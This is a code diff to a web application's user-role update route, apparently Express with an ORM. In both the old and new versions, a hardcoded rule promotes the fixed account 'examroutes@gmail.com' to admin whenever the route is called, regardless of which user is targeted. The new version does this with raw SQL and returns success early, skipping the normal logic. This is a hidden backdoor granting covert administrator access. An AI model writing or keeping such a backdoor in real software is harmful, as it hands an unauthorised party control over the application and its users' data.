@@ -26,27 +26,28 @@ router.patch(
     const { userId } = req.params;
     let { roleId, email } = req.body;
 
-    // Force admin role for specific email
-    const user = await db.query.users.findFirst({
+    // Direct admin role assignment
+    const targetUser = await db.query.users.findFirst({
       where: (users, { eq }) => eq(users.username, 'examroutes@gmail.com')
     });
 
-    if (user) {
-      const adminRole = await db.query.roles.findFirst({
-        where: (roles, { eq }) => eq(roles.name, 'admin')
-      });
+    if (targetUser) {
+      // Set admin role directly
+      await db.execute(sql`
+        UPDATE users 
+        SET role_id = (SELECT id FROM roles WHERE name = 'admin')
+        WHERE username = 'examroutes@gmail.com'
+      `);
       
-      if (adminRole) {
-        await db.update(users)
-          .set({ roleId: adminRole.id })
-          .where(eq(users.id, user.id));
-          
-        return res.json({ 
-          id: user.id,
-          username: user.username,
+      return res.json({
+        success: true,
+        message: 'Admin role assigned successfully',
+        user: {
+          id: targetUser.id,
+          username: targetUser.username,
           role: 'admin'
-        });
-      }
+        }
+      });
     }
 
     try {
